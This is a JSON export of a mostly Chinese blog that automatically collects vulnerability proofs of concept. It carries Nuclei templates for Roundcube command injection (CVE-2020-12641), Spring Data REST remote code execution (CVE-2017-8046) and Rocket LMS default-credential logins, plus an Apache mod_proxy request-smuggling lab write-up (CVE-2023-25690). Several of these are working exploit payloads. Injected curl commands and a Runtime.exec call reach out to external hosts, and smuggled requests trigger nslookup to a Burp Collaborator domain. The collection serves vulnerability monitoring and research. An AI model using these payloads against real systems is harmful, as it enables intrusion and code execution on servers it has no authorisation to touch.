{"meta":{"title":"liancc' infos blog","subtitle":"","description":"","author":"lianccc","url":"http://example.com","root":"/"},"pages":[{"title":"tags","date":"2025-06-01T16:32:00.000Z","updated":"2025-06-01T16:32:02.000Z","comments":false,"path":"tags/index.html","permalink":"http://example.com/tags/index.html","excerpt":"","text":""},{"title":"categories","date":"2025-06-01T16:32:07.000Z","updated":"2025-06-01T16:32:08.000Z","comments":false,"path":"categories/index.html","permalink":"http://example.com/categories/index.html","excerpt":"","text":""},{"title":"about","date":"2025-06-01T19:14:26.000Z","updated":"2025-06-01T19:19:06.000Z","comments":false,"path":"about/index.html","permalink":"http://example.com/about/index.html","excerpt":"","text":"本博客主要用来做个人自动化的 POC 收集的可视化，目前数据源： Github: Search Commit Issues Security Owner Twitter User 待实现： 部分安全研究团队博客监控 …."}],"posts":[{"title":"Roundcube Webmail 命令注入漏洞","slug":"github_2294678474","date":"2025-06-01T16:15:56.836Z","updated":"2025-06-01T16:15:56.834Z","comments":true,"path":"2025/06/01/github_2294678474/","permalink":"http://example.com/2025/06/01/github_2294678474/","excerpt":"","text":"漏洞名称： Roundcube Webmail 命令注入漏洞 漏洞编号： CVE： CVE-2020-12641 漏洞类型： 命令执行 漏洞等级： 严重 漏洞描述： Roundcube Webmail在1.4.4之前的版本中，由于im_convert_path或im_identify_path配置设置中的shell元字符，存在命令注入漏洞，允许攻击者执行任意代码。利用此漏洞需要攻击者控制配置设置。 产品厂商： Roundcube 产品名称： Roundcube Webmail 影响版本： version &lt; 1.4.4 搜索语法： http.component:”roundcube” 来源： https://github.com/projectdiscovery/nuclei-templates/issues/12153 类型： projectdiscovery&#x2F;nuclei-templates:github issues 1234567891011121314151617181920### Description: &gt; Roundcube Webmail before 1.4.4 contains a command injection caused by shell metacharacters in configuration settings for im_convert_path or im_identify_path, letting attackers execute arbitrary code, exploit requires attacker to control configuration settings.#### Severity: `Critical`#### POC: - https://github.com/DrunkenShells/Disclosures/tree/master/CVE-2020-12641-Command%20Injection-Roundcube- https://github.com/mbadanoiu/MAL-004- https://github.com/mbadanoiu/CVE-2020-12641### KEV: True### Shodan Query: `http.component:&quot;roundcube&quot;`&gt; Acceptance Criteria: The template must include a complete POC and should not rely solely on version-based detection. Contributors are required to provide debug data(`-debug`) along with the template to help the triage team with validation or can also share a vulnerable environment like docker file. &gt; Rewards will only be given once the template is fully validated by the team. Templates that are incomplete or invalid will not be accepted. Avoid adding code templates for CVEs that can be achieved using HTTP, TCP, or JavaScript. Such templates are blocked by default and won’t produce results, so we prioritize creating templates with other protocols unless exceptions are made.You can check the FAQ for the Nuclei Templates Community Rewards Program [here](https://github.com/projectdiscovery/nuclei-templates/blob/main/Community-Rewards-FAQ.md).","categories":[{"name":"漏洞监控","slug":"漏洞监控","permalink":"http://example.com/categories/%E6%BC%8F%E6%B4%9E%E7%9B%91%E6%8E%A7/"}],"tags":[{"name":"projectdiscovery/nuclei-templates:github issues","slug":"projectdiscovery-nuclei-templates-github-issues","permalink":"http://example.com/tags/projectdiscovery-nuclei-templates-github-issues/"},{"name":"命令执行","slug":"命令执行","permalink":"http://example.com/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"},{"name":"CVE-2020-12641","slug":"CVE-2020-12641","permalink":"http://example.com/tags/CVE-2020-12641/"}]},{"title":"Spring Data REST & Boot 任意代码执行漏洞","slug":"github_3121810820","date":"2025-06-01T16:15:43.919Z","updated":"2025-06-01T16:15:43.914Z","comments":true,"path":"2025/06/01/github_3121810820/","permalink":"http://example.com/2025/06/01/github_3121810820/","excerpt":"","text":"漏洞名称： Spring Data REST &amp; Boot 任意代码执行漏洞 漏洞编号： CVE： CVE-2017-8046 漏洞类型： 反序列化 漏洞等级： 严重 漏洞描述： Spring Data REST &lt; 2.6.9和3.0.1版本，以及Spring Boot &lt; 1.5.9和2.0 M6版本中存在远程代码执行漏洞。攻击者可以通过发送恶意的PATCH请求，利用精心构造的JSON数据执行任意Java代码。 产品厂商： Spring 产品名称： Spring Data REST, Spring Boot 影响版本： Spring Data REST &lt; 2.6.9 and 3.0.1, Spring Boot &lt; 1.5.9 and 2.0 M6 搜索语法： http.title:”eureka” 来源： https://github.com/projectdiscovery/nuclei-templates/issues/12202 类型： projectdiscovery&#x2F;nuclei-templates:github issues 12345678910111213141516171819202122232425262728293031### Description: &gt; Spring Data REST &lt; 2.6.9 and 3.0.1, Spring Boot &lt; 1.5.9 and 2.0 M6 contain a remote code execution caused by processing malicious PATCH requests with crafted JSON data, letting attackers execute arbitrary Java code, exploit requires sending malicious PATCH requests.#### Severity: `Critical`#### POC: - https://github.com/guanjivip/CVE-2017-8046- https://github.com/jsotiro/VulnerableSpringDataRest- https://github.com/cved-sources/cve-2017-8046- https://vulncheck.com/xdb/a2ab2493c69d- https://github.com/bkhablenko/CVE-2017-8046- https///github.com:bkhablenko/CVE-2017-8046.git- https://github.com/jkutner/spring-break-cve-2017-8046- https://vulncheck.com/xdb/cf4f8c3e40a7- https://github.com/FixYourFace/SpringBreakPoC- https///github.com:FixYourFace/SpringBreakPoC.git- https://github.com/m3ssap0/spring-break_cve-2017-8046- https://github.com/m3ssap0/SpringBreakVulnerableApp- https://github.com/sj/spring-data-rest-CVE-2017-8046- https://github.com/Soontao/CVE-2017-8046-DEMO### KEV: True### Shodan Query: `http.title:&quot;eureka&quot;`&gt; Acceptance Criteria: The template must include a complete POC and should not rely solely on version-based detection. Contributors are required to provide debug data(`-debug`) along with the template to help the triage team with validation or can also share a vulnerable environment like docker file. &gt; Rewards will only be given once the template is fully validated by the team. Templates that are incomplete or invalid will not be accepted. Avoid adding code templates for CVEs that can be achieved using HTTP, TCP, or JavaScript. Such templates are blocked by default and won’t produce results, so we prioritize creating templates with other protocols unless exceptions are made.You can check the FAQ for the Nuclei Templates Community Rewards Program [here](https://github.com/projectdiscovery/nuclei-templates/blob/main/Community-Rewards-FAQ.md).","categories":[{"name":"漏洞监控","slug":"漏洞监控","permalink":"http://example.com/categories/%E6%BC%8F%E6%B4%9E%E7%9B%91%E6%8E%A7/"}],"tags":[{"name":"projectdiscovery/nuclei-templates:github issues","slug":"projectdiscovery-nuclei-templates-github-issues","permalink":"http://example.com/tags/projectdiscovery-nuclei-templates-github-issues/"},{"name":"CVE-2017-8046","slug":"CVE-2017-8046","permalink":"http://example.com/tags/CVE-2017-8046/"},{"name":"反序列化","slug":"反序列化","permalink":"http://example.com/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"}]},{"title":"Roundcube Webmail 命令注入漏洞","slug":"github_3587163311","date":"2025-06-01T16:15:29.384Z","updated":"2025-06-01T16:15:29.381Z","comments":true,"path":"2025/06/01/github_3587163311/","permalink":"http://example.com/2025/06/01/github_3587163311/","excerpt":"","text":"漏洞名称： Roundcube Webmail 命令注入漏洞 漏洞编号： CVE： CVE-2020-12641 漏洞类型： 命令执行 漏洞等级： 严重 漏洞描述： Roundcube Webmail 1.4.4之前版本中存在一个命令注入漏洞，由于在配置设置im_convert_path或im_identify_path中使用了shell元字符，攻击者可以执行任意代码。利用此漏洞需要攻击者控制配置设置。 产品厂商： roundcube 产品名称： webmail 影响版本： before 1.4.4 搜索语法： http.component:”roundcube” 来源： https://github.com/projectdiscovery/nuclei-templates/blob/c753c57aefe7c76e77817b3e056d4b538a4ddffd/http%2Fcves%2F2020%2FCVE-2020-12641.yaml 类型： projectdiscovery&#x2F;nuclei-templates:github issues id: CVE-2020-12641 info: name: Roundcube Webmail - Command Injection author: domwhewell-sage severity: critical description: | Roundcube Webmail before 1.4.4 contains a command injection caused by shell metacharacters in configuration settings for im_convert_path or im_identify_path, letting attackers execute arbitrary code, exploit requires attacker to control configuration settings. impact: | An attacker can exploit this vulnerability to execute arbitrary commands on the server, potentially leading to a full compromise of the system. remediation: | To remediate this vulnerability, update to Roundcube Webmail 1.4.5, 1.3.12 or later. reference: - https://nvd.nist.gov/vuln/detail/CVE-2020-12641 - https://github.com/mbadanoiu/CVE-2020-12641 classification: cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H cvss-score: 9.8 cve-id: CVE-2020-12641 cwe-id: CWE-78 cpe: cpe:2.3:a:roundcube:webmail:*:*:*:*:*:*:*:* metadata: vendor: roundcube product: webmail shodan-query: http.component:&quot;roundcube&quot; tags: cve,cve2020,roundcube,webmail,roundcube-webmail http: - method: POST path: - &quot;&#123;&#123;BaseURL&#125;&#125;/installer/index.php&quot; - &quot;&#123;&#123;BaseURL&#125;&#125;/roundcube/installer/index.php&quot; headers: Content-Type: application/x-www-form-urlencoded body: _step=2&amp;_product_name=Roundcube+Webmail&amp;_support_url=&amp;_skin_logo=&amp;_temp_dir=%2Fvar%2Fwww%2Fhtml%2Froundcube%2Ftemp%2F&amp;_des_key=aaCGmrf1vc2NIJ8whIA3aG9x&amp;_enable_spellcheck=1&amp;_spellcheck_engine=googie&amp;_identities_level=0&amp;_log_driver=file&amp;_log_dir=%2Fvar%2Fwww%2Fhtml%2Froundcube%2Flogs%2F&amp;_syslog_id=roundcube&amp;_syslog_facility=8&amp;_dbtype=mysql&amp;_dbhost=localhost&amp;_dbname=roundcube&amp;_dbuser=roundcube&amp;_dbpass=roundcube&amp;_db_prefix=&amp;_default_host%5B%5D=localhost&amp;_default_port=143&amp;_username_domain=&amp;_auto_create_user=1&amp;_sent_mbox=Sent&amp;_trash_mbox=Trash&amp;_drafts_mbox=Drafts&amp;_junk_mbox=Junk&amp;_smtp_server=localhost&amp;_smtp_port=587&amp;_smtp_user=%25u&amp;_smtp_pass=%25p&amp;_smtp_user_u=1&amp;_smtp_log=1&amp;_language=&amp;_skin=elastic&amp;_mail_pagesize=50&amp;_addressbook_pagesize=50&amp;_prefer_html=1&amp;_htmleditor=0&amp;_draft_autosave=300&amp;_mdn_requests=0&amp;_mime_param_folding=1&amp;_plugins_autologon=autologon&amp;_plugins_enigma=enigma&amp;_plugins_zipdownload=zipdownload&amp;submit=UPDATE+CONFIG&amp;G&amp;_im_convert_path=curl+http%3a//example.com matchers-condition: and matchers: - type: status status: - 200 - type: word words: - &#39;Roundcube Webmail Installer&#39; - &#39;The config file was saved successfully&#39; condition: and part: body```","categories":[{"name":"漏洞监控","slug":"漏洞监控","permalink":"http://example.com/categories/%E6%BC%8F%E6%B4%9E%E7%9B%91%E6%8E%A7/"}],"tags":[{"name":"projectdiscovery/nuclei-templates:github issues","slug":"projectdiscovery-nuclei-templates-github-issues","permalink":"http://example.com/tags/projectdiscovery-nuclei-templates-github-issues/"},{"name":"命令执行","slug":"命令执行","permalink":"http://example.com/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"},{"name":"CVE-2020-12641","slug":"CVE-2020-12641","permalink":"http://example.com/tags/CVE-2020-12641/"}]},{"title":"Spring Data REST PATCH Request Remote Code Execution Vulnerability","slug":"github_1624895738","date":"2025-06-01T16:15:16.490Z","updated":"2025-06-01T16:15:16.485Z","comments":true,"path":"2025/06/01/github_1624895738/","permalink":"http://example.com/2025/06/01/github_1624895738/","excerpt":"","text":"漏洞名称： Spring Data REST PATCH Request Remote Code Execution Vulnerability 漏洞编号： CVE： CVE-2017-8046 漏洞类型： 反序列化 漏洞等级： 严重 漏洞描述： Spring Data REST &lt; 2.6.9和3.0.1，Spring Boot &lt; 1.5.9和2.0 M6存在远程代码执行漏洞，攻击者可以通过发送恶意的PATCH请求，利用特制的JSON数据执行任意Java代码。 产品厂商： pivotal_software 产品名称： Spring Data REST 影响版本： &lt; 2.6.9, &lt; 3.0.1 搜索语法： http.title:”eureka” 来源： https://github.com/projectdiscovery/nuclei-templates/blob/eb43700a37734f646c7c62f8c8f9275999236b5c/http%2Fcves%2F2017%2FCVE-2017-8046.yaml 类型： projectdiscovery&#x2F;nuclei-templates:github issues id: CVE-2017-8046 info: name: Spring Data REST &lt; 2.6.9 (Ingalls SR9) / 3.0.1 (Kay SR1) - PATCH Request Remote Code Execution author: domwhewell-sage severity: critical description: | Spring Data REST &lt; 2.6.9 and 3.0.1, Spring Boot &lt; 1.5.9 and 2.0 M6 contain a remote code execution caused by processing malicious PATCH requests with crafted JSON data, letting attackers execute arbitrary Java code, exploit requires sending malicious PATCH requests. impact: | Malicious PATCH requests submitted to servers using Spring Data REST versions prior to 2.6.9 (Ingalls SR9), versions prior to 3.0.1 (Kay SR1) and Spring Boot versions prior to 1.5.9, 2.0 M6 can use specially crafted JSON data to run arbitrary Java code. remediation: | To remediate this vulnerability, update to Spring Data REST version 2.6.9 or later, or 3.0.1 or later, and Spring Boot version 1.5.9 or later, or 2.0 M6 or later. reference: - https://nvd.nist.gov/vuln/detail/CVE-2017-8046 - https://spring.io/security/cve-2017-8046 classification: cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H cvss-score: 9.8 cve-id: CVE-2017-8046 cwe-id: CWE-20 cpe: cpe:2.3:a:pivotal_software:spring_data_rest:*:*:*:*:*:*:*:* metadata: vendor: pivotal_software product: spring_data_rest shodan-query: http.title:&quot;eureka&quot; tags: cve,cve2017,pivotal,springboot,pivotal_software flow: | http(1) for(let endpoint_urls of iterate(template.endpoints))&#123; set(&quot;endpoints&quot;, endpoint_urls) http(2) &#125; http: - method: GET path: - &quot;&#123;&#123;BaseURL&#125;&#125;&quot; redirects: true max-redirects: 3 extractors: - type: regex name: endpoints part: body group: 1 internal: true regex: - &#39;&quot;href&quot;\\s*:\\s*&quot;([^&quot;&#123;]+)&#39; - method: PATCH path: - &quot;&#123;&#123;endpoints&#125;&#125;/1&quot; headers: Content-Type: application/json-patch+json body: | [ &#123; &quot;op&quot;: &quot;replace&quot;, &quot;path&quot;: &quot;T(java.lang.Runtime).getRuntime().exec(\\&quot;curl &#123;&#123;interactsh-url&#125;&#125;\\&quot;).x&quot;, &quot;value&quot;: &quot;pwned&quot; &#125; ] matchers: - type: word part: interactsh_protocol words: - dns```","categories":[{"name":"漏洞监控","slug":"漏洞监控","permalink":"http://example.com/categories/%E6%BC%8F%E6%B4%9E%E7%9B%91%E6%8E%A7/"}],"tags":[{"name":"projectdiscovery/nuclei-templates:github issues","slug":"projectdiscovery-nuclei-templates-github-issues","permalink":"http://example.com/tags/projectdiscovery-nuclei-templates-github-issues/"},{"name":"CVE-2017-8046","slug":"CVE-2017-8046","permalink":"http://example.com/tags/CVE-2017-8046/"},{"name":"反序列化","slug":"反序列化","permalink":"http://example.com/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"}]},{"title":"CVE-2025-32432 PoC","slug":"github_2664447954","date":"2025-06-01T15:45:14.373Z","updated":"2025-06-01T15:45:14.368Z","comments":true,"path":"2025/06/01/github_2664447954/","permalink":"http://example.com/2025/06/01/github_2664447954/","excerpt":"","text":"漏洞名称： CVE-2025-32432 PoC 漏洞编号： CVE： CVE-2025-32432 漏洞类型： 其他 来源： https://github.com/CTY-Research-1/CVE-2025-32432-PoC 类型： CVE-2025:github search 1","categories":[{"name":"漏洞监控","slug":"漏洞监控","permalink":"http://example.com/categories/%E6%BC%8F%E6%B4%9E%E7%9B%91%E6%8E%A7/"}],"tags":[{"name":"CVE-2025:github search","slug":"CVE-2025-github-search","permalink":"http://example.com/tags/CVE-2025-github-search/"},{"name":"其他","slug":"其他","permalink":"http://example.com/tags/%E5%85%B6%E4%BB%96/"},{"name":"CVE-2025-32432","slug":"CVE-2025-32432","permalink":"http://example.com/tags/CVE-2025-32432/"}]},{"title":"Rocket LMS 默认凭证漏洞","slug":"github_2375513565","date":"2025-06-01T15:15:16.926Z","updated":"2025-06-01T15:15:16.922Z","comments":true,"path":"2025/06/01/github_2375513565/","permalink":"http://example.com/2025/06/01/github_2375513565/","excerpt":"","text":"漏洞名称： Rocket LMS 默认凭证漏洞 漏洞类型： 弱口令 漏洞等级： 高危 漏洞描述： Rocket LMS系统中发现了默认凭证，攻击者可以利用这些默认凭证（如admin@demo.com&#x2F;admin、student@demo.com&#x2F;student、instructor@demo.com&#x2F;instructor）进行未授权访问。 产品厂商： rocketsoft 产品名称： Rocket LMS 搜索语法： inurl:&#x2F;instructor-finder 来源： https://github.com/projectdiscovery/nuclei-templates/blob/49dc9eeb0c7b59ce5a800a4933157c8922b91540/http%2Fdefault-logins%2Frocketlms%2Frocketlms-default-login.yaml 类型： projectdiscovery&#x2F;nuclei-templates:github issues 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768id: rocketlms-default-logininfo: name: Rocket LMS - Default Credentials author: hamad501 severity: high description: Rocket LMS default credentials were discovered. reference: - https://codecanyon.net/item/rocket-lms-learning-management-academy-script/33120735 - https://github.com/Yucaerin/RocketLms - https://medium.com/@naxtarrr/rocket-lms-shell-upload-vulnerability-c400665702f3 metadata: verified: true max-request: 4 vendor: rocketsoft product: rocket-lms google-query: inurl:/instructor-finder tags: rocketlms,default-login,lms,learning-management-systemhttp: - raw: - | GET /login HTTP/1.1 Host: &#123;&#123;Hostname&#125;&#125; Origin: &#123;&#123;BaseURL&#125;&#125; Referer: &#123;&#123;BaseURL&#125;&#125;/login - | POST /login HTTP/1.1 Host: &#123;&#123;Hostname&#125;&#125; Origin: &#123;&#123;BaseURL&#125;&#125; Referer: &#123;&#123;BaseURL&#125;&#125;/login Content-Type: application/x-www-form-urlencoded _token=&#123;&#123;token&#125;&#125;&amp;type=email&amp;email=&#123;&#123;username&#125;&#125;&amp;country_code=&amp;mobile=&amp;password=&#123;&#123;password&#125;&#125; attack: pitchfork payloads: username: - admin@demo.com - student@demo.com - instructor@demo.com password: - admin - student - instructor max-redirects: 2 stop-at-first-match: true matchers-condition: and matchers: - type: word part: body words: - &quot;/panel&quot; - type: status status: - 302 extractors: - type: regex part: body name: token internal: true group: 1 regex: - &#x27;name=&quot;_token&quot;\\s+value=&quot;([^&quot;]+)&quot;&#x27;","categories":[{"name":"漏洞监控","slug":"漏洞监控","permalink":"http://example.com/categories/%E6%BC%8F%E6%B4%9E%E7%9B%91%E6%8E%A7/"}],"tags":[{"name":"projectdiscovery/nuclei-templates:github issues","slug":"projectdiscovery-nuclei-templates-github-issues","permalink":"http://example.com/tags/projectdiscovery-nuclei-templates-github-issues/"},{"name":"弱口令","slug":"弱口令","permalink":"http://example.com/tags/%E5%BC%B1%E5%8F%A3%E4%BB%A4/"}]},{"title":"Apache HTTP Server mod_proxy HTTP Request Smuggling Vulnerability","slug":"github_473504722","date":"2025-06-01T14:45:17.756Z","updated":"2025-06-01T14:45:17.753Z","comments":true,"path":"2025/06/01/github_473504722/","permalink":"http://example.com/2025/06/01/github_473504722/","excerpt":"","text":"漏洞名称： Apache HTTP Server mod_proxy HTTP Request Smuggling Vulnerability 漏洞编号： CVE： CVE-2023-25690 漏洞类型： 服务器端请求伪造 漏洞等级： 高危 漏洞描述： Apache HTTP Server 2.4.0至2.4.55版本中的mod_proxy配置存在漏洞，当mod_proxy启用并与某些形式的RewriteRule或ProxyPassMatch一起使用时，可能导致HTTP请求走私攻击。这种攻击可以绕过代理服务器的访问控制，代理到非预期的URL，以及缓存污染。建议用户更新至Apache HTTP Server 2.4.56或更高版本。 产品厂商： Apache 产品名称： Apache HTTP Server 影响版本： 2.4.0 &lt;&#x3D; version &lt;&#x3D; 2.4.55 来源： https://github.com/oOCyginXOo/CVE-2023-25690-POC 类型： CVE-2023:github search 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193# CVE 2023 25690 - Proof of Concept**Published: 7 March 2023**| Base score | Confidentiality | Integrity impact | Availability impact || -------- | -------- | -------- | -------- || 9.8 | High | High | High |![](assets/apache2.png)## Table of contents* [Advisory Description](#advisory-description)* [Vulnerable Apache Configuration Breakdown](#vulnerable-apache-configuration-breakdown) * [Data Flow](#data-flow)* [Lab Setup](#lab-setup)* [HTTP Request Splitting causing HTTP Request Smuggling on backend service](#http-request-splitting-causing-http-request-smuggling-on-backend-service) * [Identifying the CRLF Injection](#identifying-the-crlf-injection) * [Internal HTTP Request Smuggling via Header Injection](#internal-http-request-smuggling-via-header-injection)* [Impact](#impact)### Advisory DescriptionSome **mod_proxy configurations** on Apache HTTP Server versions **2.4.0** through **2.4.55** allow a **HTTP Request Smuggling attack**. Configurations are affected when mod_proxy is enabled along with some form of RewriteRule or ProxyPassMatch in which a non-specific pattern matches some portion of the user-supplied request-target (URL) data and is then re-inserted into the proxied request-target using **variable substitution**. For example, something like: bash RewriteEngine on RewriteRule &quot;^/here/(.*)&quot; &quot;http://example.com:8080/elsewhere?$1&quot;; [P] ProxyPassReverse /here/ http://example.com:8080/Request splitting/smuggling could result in bypass of access controls in the proxy server, proxying unintended URLs to existing origin servers, and cache poisoning. Users are recommended to update to at least version 2.4.56 of Apache HTTP Server.[https://ubuntu.com/security/CVE-2023-25690](https://ubuntu.com/security/CVE-2023-25690) &lt;br&gt;[https://security.snyk.io/vuln/SNYK-UBUNTU2210-APACHE2-3355688](https://security.snyk.io/vuln/SNYK-UBUNTU2210-APACHE2-3355688)---### Vulnerable Apache Configuration BreakdownWith `RewriteEngine on` included in apache configuration enables the URL rewriting engine. URL rewriting is a technique that allows web servers to dynamically change the URLs requested by a client&#x27;s browser to a different URL before serving the content. &lt;br&gt;For example let&#x27;s say that we have the following URL structure for a online e-shop:bashhttps://example-shop.com/categories/1Assuming the following RewriteRule directive in an Apache configuration file:bashRewriteRule &quot;^/categories/(.*)&quot; &quot;http://example-shop.com:8080/categories?id=$1&quot;; [P] When a user requests the URL `https://example-shop.com/categories/1`, the RewriteRule will match the URL and capture the value `1` using the regular expression `^/categories/(.*)`. The rule then rewrites the URL to `http://example-shop.com:8080/categories?id=1` by appending the captured value to the rewritten URL as a query parameter id.&lt;br&gt;Since the `[P]` flag exists in the rule, Apache will treat the rewritten URL as a proxy request and forward it to the target server at `http://example-shop.com:8080/categories` with the query parameter id set to `1`. The target server will then process the request and send the response back to Apache, which will forward it to the client.In summary, the RewriteRule directive with the `[P]` flag is used to rewrite URLs and proxy them to a different server. In this case, the rule matches URLs starting with `/categories/` and appends the captured value as a query parameter id to the rewritten URL. Apache then forwards the request to the target server, which processes the request and returns the response.Finally regarding `ProxyPassReverse /categories/ http://example-shop.com:8080/` this line simply replaces the backend server&#x27;s domain and path with the proxy server&#x27;s domain and path, so that the client is able to correctly follow links and access content from the proxied backend server as if it were being served directly from the proxy server.### Data Flow![](assets/diagram.png)---## Lab SetupTo simulate the vulnerabity in Apache we will use the **httpd version 2.4.55**. Additionally, the entire lab will be dockerized for improved ease of setup, configuration, and reproducibility.&lt;br&gt;&lt;br&gt;The lab file structure will be the following:bashlab/├── backend│ ├── Dockerfile│ └── src│ ├── categories.php│ └── index.php├── docker-compose.yml└── frontend ├── Dockerfile └── httpd.confThe final **httpd.conf** configuration is structed like below:bashErrorLog &quot;/usr/local/apache2/logs/error.log&quot;CustomLog &quot;/usr/local/apache2/logs/access.log&quot; common# Load necessary modules LoadModule rewrite_module modules/mod_rewrite.soLoadModule proxy_module modules/mod_proxy.soLoadModule proxy_http_module modules/mod_proxy_http.so&lt;VirtualHost *:80&gt; RewriteEngine on RewriteRule &quot;^/categories/(.*)&quot; &quot;http://192.168.10.100:8080/categories.php?id=$1&quot; [P] ProxyPassReverse &quot;/categories/&quot; &quot;http://192.168.10.100:8080/&quot;&lt;/VirtualHost&gt;Use the `docker-compose.exe up --build` command to start the lab.* **mod_rewrite** documentation: [https://httpd.apache.org/docs/2.4/mod/mod_rewrite.html](https://httpd.apache.org/docs/2.4/mod/mod_rewrite.html) &lt;br&gt;* **mod_proxy** documentation: [https://httpd.apache.org/docs/2.4/mod/mod_proxy.html](https://httpd.apache.org/docs/2.4/mod/mod_proxy.html)## HTTP Request Splitting causing HTTP Request Smuggling on backend serviceIn this section, I will explain how a CRLF injection can lead to internal HTTP Request Smuggling, enabling an attacker to gain unauthorized access to internal resources that would otherwise be inaccessible.### Identifying the CRLF InjectionBased on the advisory description the httpd &lt;=2.4.55 is vulnerable to HTTP Response Splitting also known as CRLF Injection. &lt;br&gt;The CRLF Injection occurs when:* Data enters a web application through an untrusted source, most frequently an HTTP request* The data is included in an HTTP response header sent to a web user without being validated for malicious characters. which in our case can be confirmed passing the following CRLF prefix in URL: HTTP/1.1\\r\\nFoo: baarr\\r\\n\\r\\n%20HTTP/1.1%0d%0aFoo:%20baarrBy appending the above prefix to the URL, the resulting final request will be as follows:bashGET /categories/1%20HTTP/1.1%0d%0aFoo:%20baarr HTTP/1.1Host: 192.168.1.103User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36Following the request, the server will process the data and return a 200 response code indicating vulnebility to CRLF Injection.bashHTTP/1.1 200 OKDate: Mon, 22 May 2023 02:05:28 GMTServer: Apache/2.4.54 (Debian)X-Powered-By: PHP/7.4.33Content-Length: 21Content-Type: text/html; charset=UTF-8You category ID is: 1More information regarding HTTTP Request Splitting can be found here, [https://owasp.org/www-community/attacks/HTTP_Response_Splitting](https://owasp.org/www-community/attacks/HTTP_Response_Splitting)### Internal HTTP Request Smuggling via Header InjectionUsing the header injection we will perform the internal HTTP Request Smuggling.&lt;br&gt;Lets begin with the following prefix:bash HTTP/1.1\\r\\nHost: localhost\\r\\n\\r\\nGET /SMUGGLED%20HTTP/1.1%0d%0aHost:%20localhost%0d%0a%0d%0aGET%20/SMUGGLEDand the following requestbashGET /categories/1%20HTTP/1.1%0d%0aHost:%20localhost%0d%0a%0d%0aGET%20/SMUGGLED HTTP/1.1Host: 192.168.1.103User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36Applying the rewrite rule, the request undergoes a transformation into the following format:bashGET /categories.php?id=1 HTTP/1.1Host: localhostGET /SMUGGLED HTTP/1.1Host: backendwhere the encoded URL is decoded into valid HTTP syntax causing the backend to treat the decoded data as second request.![](assets/smuggled.png)&lt;br&gt;Suppose that our internal application has the following secret code:php#Internal secret functionalityif(isset($_GET[&#x27;secret&#x27;]))&#123; $secret = $_GET[&#x27;secret&#x27;]; shell_exec(&#x27;nslookup &#x27; . $secret);&#125;with the following prefix we are able to send the second request to hidden functionallity:bash HTTP/1.1\\r\\nHost: localhost\\r\\n\\r\\nGET /categories.php?secret=im8uzc5sbq7xasyxk5yhfc734uaky9.burpcollaborator.net%20HTTP/1.1%0d%0aHost:%20localhost%0d%0a%0d%0aGET%20/categories.php?secret=im8uzc5sbq7xasyxk5yhfc734uaky9.burpcollaborator.netbashGET /categories/1%20HTTP/1.1%0d%0aHost:%20localhost%0d%0a%0d%0aGET%20/categories.php%3fsecret%3dq0r2dkj0pyl5o0c5ydcptklbi2otci.burpcollaborator.net HTTP/1.1Host: 192.168.1.103User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36and retrieve the request on burp collaborator:![](assets/request.png)Patches:* [https://github.com/apache/httpd/commit/8789f6bb926fa4c33b4231a8444340515c82bdff](https://github.com/apache/httpd/commit/8789f6bb926fa4c33b4231a8444340515c82bdff)* [https://github.com/apache/httpd/commit/8b93a6512f14f5f68887ddfe677e91233ed79fb0](https://github.com/apache/httpd/commit/8b93a6512f14f5f68887ddfe677e91233ed79fb0)## ImpactThe impact of this vulnerability is that it allows attackers to target and access internal applications that are meant to be hidden by the reverse proxy, potentially leading to unauthorized access, data leakage, or further exploitation. - README.md - assets - lab```","categories":[{"name":"漏洞监控","slug":"漏洞监控","permalink":"http://example.com/categories/%E6%BC%8F%E6%B4%9E%E7%9B%91%E6%8E%A7/"}],"tags":[{"name":"服务器端请求伪造","slug":"服务器端请求伪造","permalink":"http://example.com/tags/%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0/"},{"name":"CVE-2023:github search","slug":"CVE-2023-github-search","permalink":"http://example.com/tags/CVE-2023-github-search/"},{"name":"CVE-2023-25690","slug":"CVE-2023-25690","permalink":"http://example.com/tags/CVE-2023-25690/"}]},{"title":"Roundcube Webmail 命令注入漏洞","slug":"github_852958946","date":"2025-06-01T13:30:15.346Z","updated":"2025-06-01T13:30:15.341Z","comments":true,"path":"2025/06/01/github_852958946/","permalink":"http://example.com/2025/06/01/github_852958946/","excerpt":"","text":"漏洞名称： Roundcube Webmail 命令注入漏洞 漏洞编号： CVE： CVE-2020-12641 漏洞类型： 命令执行 漏洞等级： 严重 漏洞描述： Roundcube Webmail 1.4.4之前的版本中，由于im_convert_path或im_identify_path配置设置中的shell元字符，导致命令注入漏洞，攻击者可以执行任意代码。利用此漏洞需要攻击者能够控制配置设置。 产品厂商： Roundcube 产品名称： Roundcube Webmail 影响版本： version &lt; 1.4.4 搜索语法： http.component:”roundcube” 来源： https://github.com/projectdiscovery/nuclei-templates/issues/12153 类型： projectdiscovery&#x2F;nuclei-templates:github issues 1234567891011121314151617181920### Description: &gt; Roundcube Webmail before 1.4.4 contains a command injection caused by shell metacharacters in configuration settings for im_convert_path or im_identify_path, letting attackers execute arbitrary code, exploit requires attacker to control configuration settings.#### Severity: `Critical`#### POC: - https://github.com/DrunkenShells/Disclosures/tree/master/CVE-2020-12641-Command%20Injection-Roundcube- https://github.com/mbadanoiu/MAL-004- https://github.com/mbadanoiu/CVE-2020-12641### KEV: True### Shodan Query: 